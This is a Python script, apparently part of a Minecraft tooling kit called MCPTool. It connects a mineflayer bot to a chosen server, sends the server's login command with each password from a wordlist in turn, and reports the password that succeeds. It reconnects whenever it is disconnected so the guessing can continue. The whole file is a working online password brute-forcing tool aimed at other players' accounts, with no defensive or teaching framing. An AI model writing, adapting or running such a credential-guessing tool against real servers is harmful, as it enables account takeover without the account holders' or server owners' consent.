#!/usr/bin/python3

# Script created for MCPTool
# @wrrulos

import subprocess
import sys
import json
import time
import os

from colorama import Fore, init
from javascript import require, On, Once, console
from argparse import ArgumentParser

process = require("process", "latest")
mineflayer = require("mineflayer", "latest")

red, lred, black, lblack, white, green, lgreen, cyan, lcyan, magenta, lmagenta, yellow, lyellow, blue, lblue, reset = Fore.RED, Fore.LIGHTRED_EX, Fore.BLACK, Fore.LIGHTBLACK_EX, Fore.WHITE, Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.CYAN, Fore.LIGHTCYAN_EX, Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.YELLOW, Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTBLUE_EX, Fore.RESET
init()

attempts = 0

f = open('settings/settings.json', 'r')
content = f.read()
f.close()

js = json.loads(content)

words_to_sign_in = js['auth']['words_to_sign_in']
words_at_login = js['auth']['words_at_login']
command = js['auth']['command']
reconnect = js['auth']['reconnect']

def taskkill(node):
    if os.name == 'nt':
        subprocess.run(f'taskkill /f /im {node} >nul 2>&1', stdout=subprocess.PIPE, shell=True)


def Bot(ip, port, version, name, file, pid, passwords):
    """
    Bot
    """

    try:
        bot = mineflayer.createBot({'host': ip, 'port': port, 'username': name, 'version': version})

        @On(bot, 'login')
        def login(this):
            print('[[CONNECTED]]')

        @On(bot, 'message')
        def handle_message(this, message, *args):
            global attempts

            #print(f"{message.toAnsi()}")

            for word in words_at_login:
                if word in str(message.toString()):
                    print(f'[[PASSWORD]] {passwords[attempts-1]}')
                    taskkill(pid)
                    sys.exit()

            for word_ in words_to_sign_in:
                if word_ in str(message.toString()):
                    try:
                        time.sleep(0.5)
                        bot.chat(f'{command} {passwords[attempts]}')
                        print(f'[[TESTING]] {passwords[attempts]}')
                        attempts += 1       

                    except IndexError:
                        print(f'[[NOT-FOUND]] {attempts}')
                        taskkill(pid)
                        sys.exit()

        @On(bot, 'kicked')
        def kicked(this, reason, *args):
            print(f'[[KICK]] {reason}') 

        @On(bot, 'end')
        def handle(this, reason, *args):
            global attempts

            if reason == 'socketClosed':
                try:
                    time.sleep(int(reconnect))

                except ValueError:
                    try:
                        time.sleep(float(reconnect))

                    except ValueError:
                        time.sleep(4)

                Bot(ip, port, version, name, file, pid, passwords)

    except KeyboardInterrupt:
        taskkill(pid)
        sys.exit()
            
if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('-host', help='Host', required=True, action='store', dest='host')
    parser.add_argument('-p', help='Port', required=True, action='store', dest='port')
    parser.add_argument('-v', help='Version', required=False, action='store', dest='version')
    parser.add_argument('-n', help='Name', required=True, action='store', dest='name')
    parser.add_argument('-f', help='Password file', required=True, action='store', dest='file')
    args = parser.parse_args()

    f = open(args.file)
    lines = f.readlines()
    f.close()

    passwords = []
    number_of_passwords = 0

    for line in lines:
        line = line.replace('\n', '')
        passwords.append(line)
        number_of_passwords += 1

    if number_of_passwords == 0:
        sys.exit()

    Bot(args.host, args.port, args.version, args.name, args.file, process.pid, passwords)
